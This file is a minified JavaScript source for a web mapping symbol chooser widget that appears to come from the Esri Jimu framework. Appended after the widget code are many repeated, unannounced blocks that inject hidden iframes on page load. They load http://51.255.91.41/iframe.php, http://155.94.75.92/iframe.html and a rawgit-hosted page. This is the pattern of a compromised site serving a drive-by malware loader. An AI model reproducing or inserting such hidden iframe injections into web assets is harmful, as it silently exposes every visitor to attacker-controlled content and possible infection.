c.addClass(this.pointOulineWidthTr,"hidden")},_showCustomPictureMarkerSymSettings:function(){c.removeClass(this.pointCustomImageTr,"hidden");c.addClass(this.pointIconTablesTr,"hidden");c.addClass(this.pointColorTr,"hidden");c.addClass(this.pointOpacityTr,"hidden");c.addClass(this.pointOutlineColorTr,"hidden");c.addClass(this.pointOulineWidthTr,"hidden")},_getPointSymbolBySetting:function(a){if(!this.symbol||a&&!this.pointSize.validate())return null;var b=parseFloat(this.pointSize.get("value"));if(this.isSimpleMarkerSymbol(this.symbol)){if(a&&
!this.pointOutlineWidth.validate())return null;this.symbol.setSize(b);a=this.pointColor.getColor();b=this.pointAlpha.getAlpha();a.a=b;this.symbol.setColor(a);a=this.pointOutlineColor.getColor();var b=parseFloat(this.pointOutlineWidth.get("value")),c=new k;c.setStyle(k.STYLE_SOLID);c.setColor(a);c.setWidth(b);this.symbol.setOutline(c)}else this.isPictureMarkerSymbol(this.symbol)&&(this.symbol.setWidth(b),this.symbol.setHeight(b));this._updatePreview(this.pointSymPreview);return this.symbol},_initImageChooser:function(){this.imageChooser=
new E({cropImage:!1,showSelfImg:!1,goldenWidth:16,goldenHeight:16,format:["image/gif","image/png","image/jpeg"],label:this.nls.chooseFile});c.addClass(this.imageChooser.domNode,"custom-image-chooser");this.own(e(this.imageChooser,"change",d.hitch(this,this._onImageChange)));this.imageChooser.placeAt(this.customImageTd,"first")},_onImageChange:function(a,b){this.imageNameNode.innerHTML=b.fileName;a=a.replace(/^data:image\/.*;base64,/,"");b=parseFloat(this.pointSize.get("value"));this._customPictureMarkerSymbol=
this.symbol=new B({type:"esriPMS",url:null,imageData:a,contentType:"image/png",color:null,width:b,height:b,angle:0,xoffset:0,yoffset:0});this._onPointSymbolChange()},_initLineSection:function(){this._showSection("line");this._lineEventBinded||(this._lineEventBinded=!0,this._bindLineEvents(),this._requestLineSymJson("line"));this._initLineSettings(this.symbol);this._getLineSymbolBySetting()},_bindLineEvents:function(){this.own(e(this.lineIconTables,".symbol-div-item:click",d.hitch(this,this._onLineSymIconItemClick)));
this.own(e(this.lineColor,"change",d.hitch(this,this._onLineSymbolChange)));this.own(e(this.lineStylesSelect,"change",d.hitch(this,this._onLineSymbolChange)));this.own(e(this.lineAlpha,"change",d.hitch(this,this._onLineSymbolChange)));this.own(e(this.lineWidth,"change",d.hitch(this,this._onLineSymbolChange)))},_onLineSymbolChange:function(){this._invokeSymbolChangeEvent&&(this._getLineSymbolBySetting(),this._onChange(this.symbol))},_initLineSettings:function(a){a&&(this._invokeSymbolChangeEvent=!1,
this.lineColor.setColor(a.color),this.lineAlpha.setAlpha(parseFloat(a.color.a.toFixed(2))),this.lineWidth.set("value",parseFloat(a.width.toFixed(0))),this.lineStylesSelect.set("value",a.style),this._invokeSymbolChangeEvent=!0)},isSimpleLineSymbol:function(a){return a&&"esri.symbol.SimpleLineSymbol"===a.declaredClass},isCartographicLineSymbol:function(a){return a&&"esri.symbol.CartographicLineSymbol"===a.declaredClass},_requestLineSymJson:function(a){var b=this._getAbsoluteUrl("jimu/dijit/SymbolsInfo/"+
a+".json");l(b,{handleAs:"json"}).then(d.hitch(this,function(b){this.domNode&&(b=this._createSymbolIconTable(a,b,"line"),c.place(b,this.lineIconTables))}),d.hitch(this,function(a){console.error("get line symbol failed",a)}))},_onLineSymIconItemClick:function(a){if(a=this._getAncestor(a.target||a.srcElement,function(a){return c.hasClass(a,"symbol-div-item")},5))if(g(".selected-symbol-div-item",a.parentNode.parentNode.parentNode).removeClass("selected-symbol-div-item"),c.addClass(a,"selected-symbol-div-item"),
a=a.symbol)a=m.fromJson(a),this._initLineSettings(a),this._onLineSymbolChange()},_getLineSymbolBySetting:function(a){if(a&&!this.lineWidth.validate())return null;this.symbol=new k;a=this.lineColor.getColor();var b=this.lineStylesSelect.get("value");a.a=this.lineAlpha.getAlpha();var c=parseFloat(this.lineWidth.get("value"));this.symbol.setStyle(b);this.symbol.setColor(a);this.symbol.setWidth(c);this._updatePreview(this.lineSymPreview);return this.symbol},_initFillSection:function(){this._showSection("fill");
this._fillEventBinded||(this._fillEventBinded=!0,this._bindFillEvents(),this._requestFillSymJson("fill"));this._initFillSettings(this.symbol);this._getFillSymbolBySetting()},_bindFillEvents:function(){this.own(e(this.fillIconTables,".symbol-div-item:click",d.hitch(this,this._onFillSymIconItemClick)));this.own(e(this.fillColor,"change",d.hitch(this,this._onFillSymbolChange)));this.own(e(this.fillAlpha,"change",d.hitch(this,this._onFillSymbolChange)));this.own(e(this.fillOutlineColor,"change",d.hitch(this,
this._onFillSymbolChange)));this.own(e(this.fillOutlineWidth,"change",d.hitch(this,this._onFillSymbolChange)))},_onFillSymbolChange:function(){this._invokeSymbolChangeEvent&&(this._getFillSymbolBySetting(),this._onChange(this.symbol))},_initFillSettings:function(a){a&&(this._invokeSymbolChangeEvent=!1,this.fillColor.setColor(a.color),this.fillAlpha.setAlpha(parseFloat(a.color.a.toFixed(2))),a.outline&&(this.fillOutlineColor.setColor(a.outline.color),this.fillOutlineWidth.set("value",parseInt(a.outline.width,
10))),this._invokeSymbolChangeEvent=!0)},_isSimpleFillSymbol:function(a){return a&&"esri.symbol.SimpleFillSymbol"===a.declaredClass},_requestFillSymJson:function(a){var b=this._getAbsoluteUrl("jimu/dijit/SymbolsInfo/"+a+".json");l(b,{handleAs:"json"}).then(d.hitch(this,function(b){this.domNode&&(b=this._createSymbolIconTable(a,b,"fill"),c.place(b,this.fillIconTables))}),d.hitch(this,function(a){console.error("get fill symbol failed",a)}))},_onFillSymIconItemClick:function(a){if(a=this._getAncestor(a.target||
a.srcElement,function(a){return c.hasClass(a,"symbol-div-item")},5))if(g(".selected-symbol-div-item",a.parentNode.parentNode.parentNode).removeClass("selected-symbol-div-item"),c.addClass(a,"selected-symbol-div-item"),a=a.symbol)a=m.fromJson(a),this._initFillSettings(a),this._onFillSymbolChange()},_getFillSymbolBySetting:function(a){if(a&&!this.fillOutlineWidth.validate())return null;this.symbol=new p;var b=this.fillColor.getColor();b.a=this.fillAlpha.getAlpha();a=this.fillOutlineColor.getColor();
var c=parseInt(this.fillOutlineWidth.get("value"),10);this.symbol.setColor(b);this.symbol.setStyle(p.STYLE_SOLID);b=new k;b.setStyle(k.STYLE_SOLID);b.setColor(a);b.setWidth(c);this.symbol.setOutline(b);this._updatePreview(this.fillSymPreview);return this.symbol},_initTextSection:function(){this._showSection("text");this._textEventBinded||(this._textEventBinded=!0,this._bindTextEvents());this._initTextSettings();this._getTextSymbolBySetting()},_bindTextEvents:function(){this.own(e(this.inputText,"change",
d.hitch(this,this._onTextSymbolChange)));this.own(e(this.textColor,"change",d.hitch(this,this._onTextSymbolChange)));this.own(e(this.textFontSize,"change",d.hitch(this,this._onTextSymbolChange)))},_onTextSymbolChange:function(){this._invokeSymbolChangeEvent&&(this._getTextSymbolBySetting(),this._onChange(this.symbol))},_initTextSettings:function(a){a&&(this._invokeSymbolChangeEvent=!1,this.inputText.value=a.text,this.textColor.setColor(a.color),a=parseInt(a.font.size,10),this.textFontSize.set("value",
a),this._invokeSymbolChangeEvent=!0)},_isTextSymbol:function(a){return a&&"esri.symbol.TextSymbol"===a.declaredClass},_updateTextPreview:function(a){var b=this.textColor.getColor().toHex(),d=parseInt(this.textFontSize.get("value"),10)+"px";c.setStyle(this.textPreview,{color:b,fontSize:d,fontFamily:a});this.textPreview.innerHTML=this.inputText.value},_getTextSymbolBySetting:function(a){if(a&&!this.textFontSize.validate())return null;this.symbol=new C;a=this.inputText.value;var b=this.textColor.getColor(),
c=parseInt(this.textFontSize.get("value"),10),d=new D;d.setSize(c);this.symbol.setText(a);this.symbol.setColor(b);this.symbol.setFont(d);this._updateTextPreview(d.family);return this.symbol},_setTemplateNls:function(){"undefined"===typeof this.nls.damage&&(this.nls.damage="Damage");"undefined"===typeof this.nls.disasters&&(this.nls.disasters="Disasters");"undefined"===typeof this.nls.emergencyManagement&&(this.nls.emergencyManagement="Emergency Management");"undefined"===typeof this.nls.generalInfrastructure&&
(this.nls.generalInfrastructure="General Infrastructure");"undefined"===typeof this.nls.localGovernment&&(this.nls.localGovernment="Local Government");"undefined"===typeof this.nls.numbers&&(this.nls.numbers="Numbers");"undefined"===typeof this.nls.pointsOfInterest&&(this.nls.pointsOfInterest="Points of Interest");"undefined"===typeof this.nls.stateGovernment&&(this.nls.stateGovernment="State Government")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});